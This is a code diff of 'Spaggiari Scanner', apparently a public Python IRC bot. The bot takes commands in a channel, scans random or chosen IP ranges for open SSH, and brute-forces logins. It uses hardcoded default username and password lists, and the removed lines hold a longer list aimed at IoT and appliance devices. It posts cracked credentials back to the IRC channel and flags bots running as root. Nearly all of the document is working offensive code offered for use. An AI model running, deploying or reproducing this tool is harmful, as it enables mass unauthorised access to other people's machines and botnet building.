@@ -30,24 +30,20 @@ Requirments:
  - Paramiko Library  (http://www.paramiko.org/)
  
 Commands:
- - @info    <id/all>           | Information about the server.
- - @kill    <id/all>           | Kill the bot.
- - @scan    <id> b <range>     | Example: @scan tnnxu b 107.13     (Scans from 107.13.0.0   to 107.13.255.255
- - @scan    <id> c <range>     | Example: @scan tnnxu c 107.13.201 (Scans from 107.13.201.0 to 107.13.201.255)
- - @scan    <id> <b/c> random  | Example: @scan tnnxu b random     (Scans from ?.?.0.0      to ?.?.255.255)
- - @status  <id/all>           | Check the scanning status on the bot.
- - @stop    <id/all>           | Stop all current running scans.
+ - @info    <id/all>             | Information about the server.
+ - @kill    <id/all>             | Kill the bot.
+ - @random  <id/all>             | Scan random ip addresses.
+ - @range   <id> <class> <range> | Scan a range of ip addresses.
+ - @range   <id> <class> random  | Scan a random range of ip addresses.
+ - @status  <id/all>             | Check the scanning status on the bot.
+ - @stop    <id/all>             | Stop all current running scans.
  
 Note: Commands require either 'all' or the bots unique id after it.
 If the bot has a nick of 'spag-tnnxu', the id of that bot is 'tnnxu'.
 You can issue a command with '@info all', or '@info tnnxu'.
- 
-Todo:
-- Create a more accurate and comprehensive spooky list.
-- Implement scanning for other services (telnet, ftp, mysql, etc).
-- Allow scanning a specific host using deep_combos.
-- Use pyinstaller to create a single executable.
-- Slow random scans when idle.
+The <class> can be b or c. The <range> is the ip address range prefix to scan.
+Example: @range tnnxu b 192.168   (Scans the range 192.168.0.0-192.168.255.255)
+Example: @range tnnxu c 192.168.1 (Scans the range 192.168.1.0-192.168.1.255)
 """
 
 import datetime
@@ -64,47 +60,26 @@ import time
 import urllib.request
 from collections import OrderedDict
 
-# IRC Config (EDIT)
-server   = 'irc.server.com'
-port     = 6697
-use_ssl  = True
-password = None
-channel  = '#dev'
-key      = None
+# IRC Config
+server     = 'irc.server.com'
+port       = 6697
+use_ssl    = True
+password   = None
+channel    = '#dev'
+key        = None
+admin_host = 'admin.host'
 
-# Other Config (EDIT)
-admin_host      = 'admin.host'
-control_char    = '@'
-timeout_breaker = 5
+# Throttle Settings
+max_threads     = 100
 throttle        = 20
+timeout_breaker = 5
+timeout_port    = 1
+timeout_ssh     = 10.0
 
 # SSH Login Combos
 combos = OrderedDict([
     ('root',  ('root','toor','admin','changeme','pass','password','1234','12345','123456')),
     ('admin', ('1234','12345','123456','4321','9999','abc123','admin','changeme','admin123','password'))
-])
-
-deep_combos = OrderedDict([
-    ('root',      ('alien','alpine','calvin','kn1TG7psLu','logapp','openelec','pixmet2003','raspberrypi','rasplex','rootme','soho','TANDBERG','trendimsa1.0')),
-    ('admin',     ('aerohive','kn1TG7psLu','TANDBERG')),
-    ('alien',     'alien'),
-    ('bitnami',   'bitnami'),
-    ('cisco',     'cisco'),
-    ('device',    'apc'),
-    ('dpn',       'changeme'),
-    ('HPSupport', 'badg3r5'),
-    ('lp',        'lp'),
-    ('master',    'themaster01'),
-    ('osmc',      'osmc'),
-    ('pi',        'raspberry'),
-    ('plexuser',  'rasplex'),
-    ('sysadmin',  'PASS'),
-    ('toor',      'logapp'),
-    ('ubnt',      'ubnt'),
-    ('user',      ('acme','live')),
-    ('vagrant',   'vagrant'),
-    ('virl',      'VIRL'),
-    ('vyos',      'vyos')
 ])
 
 # Important Ranges (DO NOT EDIT)
@@ -136,27 +111,6 @@ grey        = '14'
 light_grey  = '15'
 
 # Debug Functions
-def alert(msg):
-    print('%s | [+] - %s' % (get_time(), msg))
-
-def check_root():
-    if os.getuid() == 0 or os.geteuid() == 0:
-        return True
-    else:
-        return False
-
-def check_version(major):
-    if sys.version_info.major == major:
-        return True
-    else:
-        return False
-
-def clear():
-    if get_windows():
-        os.system('cls')
-    else:
-        os.system('clear')
-
 def debug(msg):
     print('%s | [~] - %s' % (get_time(), msg))
 
@@ -178,12 +132,6 @@ def get_windows():
     else:
         return False
 
-def keep_alive():
-    try:
-        while True : input('')
-    except KeyboardInterrupt:
-        sys.exit()
-
 
 
 # Functions
@@ -192,7 +140,7 @@ def check_ip(ip):
 
 def check_port(ip, port):
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    sock.settimeout(1)
+    sock.settimeout(timeout_port)
     try:
         code = sock.connect((ip, port))
     except socket.error:
@@ -204,20 +152,12 @@ def check_port(ip, port):
         sock.close()
 
 def check_range(targets):
-    breaker = False
     found   = False
     for ip in targets:
-        if breaker : break
-        for spooky_range in spooky:
-            if ip.startswith(spooky_range + '.'):
-                breaker = True
-                found   = True
-                break
-        if breaker : break
-        for dns_range in reserved:
-            if ip.startswith(dns_range + '.'):
-                breaker = True
-                found   = True
+        if found : break
+        for bad_range in spooky + reserved:
+            if ip.startswith(bad_range + '.'):
+                found = True
                 break
     return found
 
@@ -283,7 +223,7 @@ def random_str(size):
 
 
 # Scan Functions
-class idle_scan(threading.Thread):
+class random_scan(threading.Thread):
     def __init__(self):
         threading.Thread.__init__(self)
     def run(self):
@@ -291,12 +231,13 @@ class idle_scan(threading.Thread):
             if SpaggiariBot.stop_scan:
                 break
             else:
-                host = (random_ip())
-                if not check_range(host):
-                    ssh_bruteforce(host).start()
-                time.sleep(throttle)
-
-class scan(threading.Thread):
+                ip = (random_ip(),)
+                if not check_range(ip):
+                    ssh_bruteforce(ip).start()
+            while threading.activeCount() >= max_threads:
+                time.sleep(1)
+                    
+class range_scan(threading.Thread):
     def __init__(self, ip_range):
         self.ip_range = ip_range
         threading.Thread.__init__(self)
@@ -306,58 +247,51 @@ class scan(threading.Thread):
                 break
             else:
                 ssh_bruteforce(ip).start()
-                while threading.activeCount() >= 100:
+                self.ip_range.remove(ip)
+                while threading.activeCount() >= max_threads:
                     time.sleep(1)
-            self.ip_range.remove(ip)
-        while threading.activeCount() >= 3:
+        while threading.activeCount() >= 2:
             time.sleep(1)
         SpaggiariBot.scanning = False
         SpaggiariBot.sendmsg(chan, '[%s] - Scan has completed.' % (color('#', blue)))
 
 class ssh_bruteforce(threading.Thread):
-    def __init__(self, host):
-        self.host     = host
+    def __init__(self, ip):
+        self.ip       = ip
         self.timeouts = 0
-        self.breaker  = False
         threading.Thread.__init__(self)
     def run(self):
-        if check_port(self.host, 22):
-            alert('%s has port 22 open.' % self.host)
+        if check_port(self.ip, 22):
             for user in combos.keys():
-                if SpaggiariBot.stop_scan or self.breaker or self.timeouts >= timeout_breaker:
+                if SpaggiariBot.stop_scan or self.timeouts >= timeout_breaker:
                     break
                 else:
                     password = combos[user]
                     if type(password) == tuple:
                         for item in password:
-                            if SpaggiariBot.stop_scan or self.breaker or self.timeouts >= timeout_breaker:
+                            if SpaggiariBot.stop_scan or self.timeouts >= timeout_breaker:
                                 break
                             else:
-                                result = ssh_connect(self.host, user, item)
+                                result = ssh_connect(self.ip, user, item)
                                 if   result == 1 : self.timeouts += 1
-                                elif result == 2 : self.breaker = True
+                                elif result == 2 : self.timeouts = timeout_breaker
                                 time.sleep(throttle)
                     else:
                         result = ssh_connect(self.host, user, password)
                         if   result == 1 : self.timeouts += 1
-                        elif result == 2 : self.breaker = True
+                        elif result == 2 : self.timeouts = timeout_breaker
                         time.sleep(throttle)
-        else:
-            error('%s does not have port 22 open.' % self.host)
 
 def ssh_connect(hostname, username, password):
     ssh = paramiko.SSHClient()
     ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
     try:
-        ssh.connect(hostname, 22, username, password, timeout=10.0)
+        ssh.connect(hostname, 22, username, password, timeout=timeout_ssh)
     except socket.timeout:
-        error('Failed to connect to %s using %s:%s (Timeout)' % (hostname, username, password))
         return 1
     except Exception as ex:
-        error('Failed to connect to %s using %s:%s (%s)' % (hostname, username, password, ex))
         return 0
     else:
-        alert('Successful connection to %s using %s:%s' % (hostname, username, password))
         SpaggiariBot.sendmsg(channel, '[%s] - Successful connection to %s using %s:%s' % (color('+', green), hostname, username, password))
         return 2
     finally:
@@ -379,11 +313,10 @@ class IRC(object):
         self.sock      = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.scanning  = False
         self.stop_scan = False
-        threading.Thread.__init__(self)
 
-    def run(self):
+    def start(self):
         self.nickname = 'spag-' + random_str(5)
-        if check_root() : self.nickname = 'r' + self.nickname
+        if os.getuid() == 0 or os.geteuid() == 0: self.nickname = 'r' + self.nickname
         self.id = self.nickname[-5:]
         self.connect()
 
@@ -409,6 +342,11 @@ class IRC(object):
             except : pass
             self.sock.close()
             self.sock = None
+        self.stop_scan = True
+        while threading.activeCount() >= 3:
+            time.sleep(1)
+        self.scanning  = False
+        self.stop_scan = False
 
     def error(self, chan, msg, reason=None):
         if reason:
@@ -442,6 +380,12 @@ class IRC(object):
                         self.scanning  = False
                         self.quit('KILLED')
                         sys.exit()
+                    elif cmd == 'random':
+                        if not self.scanning:
+                            self.sendmsg(chan, '[%s] - Scanning random IP addresses...' % color('#', blue))
+                            random_scan().start()
+                        else:
+                            self.error(chan, 'A scan is already running.')
                     elif cmd == 'status':
                         if self.scanning:
                             self.sendmsg(chan, 'Scanning: ' + color('True', green))
@@ -450,13 +394,13 @@ class IRC(object):
                     elif cmd == 'stop':
                         if self.scanning:
                             self.stop_scan = True
-                            while threading.activeCount() >= 3:
+                            while threading.activeCount() >= 2:
                                 time.sleep(1)
                             self.action(chan, 'Stopped all running scans.')
                             self.scanning  = False
                             self.stop_scan = False
             elif len(args) == 4:
-                if cmd == 'scan' and args[1] == self.id:
+                if cmd == 'range' and args[1] == self.id:
                     if not self.scanning:
                         if args[2] in ('b','c'):
                             if args[2] == 'b':
@@ -543,7 +487,6 @@ class IRC(object):
         self.raw('PRIVMSG %s :%s' % (target, msg))
 
 # Main
-clear()
 print(''.rjust(56, '#'))
 print('#' + ''.center(54) + '#')
 print('#' + 'Spaggiari Scanner'.center(54) + '#')
@@ -551,16 +494,15 @@ print('#' + 'Developed by acidvegas in Python 2 & 3'.center(54) + '#')
 print('#' + 'https://github.com/acidvegas/spaggiari/'.center(54) + '#')
 print('#' + ''.center(54) + '#')
 print(''.rjust(56, '#'))
-if not check_version(3):
+if not sys.version_info.major == 3:
     error_exit('Spaggiari Scanner requires Python version 3 to run!')
 if get_windows():
     error_exit('Spaggiari Scanner must be ran on a Linux based OS!')
 try:
     import paramiko
 except ImportError:
-    error_exit('Failed to import the Paramiko library! (http://www.paramiko.org/)')
+    error_exit('Failed to import the Paramiko library!')
 else:
     paramiko.util.log_to_file('/dev/null')
 SpaggiariBot = IRC(server, port, use_ssl, password, channel, key)
 SpaggiariBot.start()
-keep_alive()
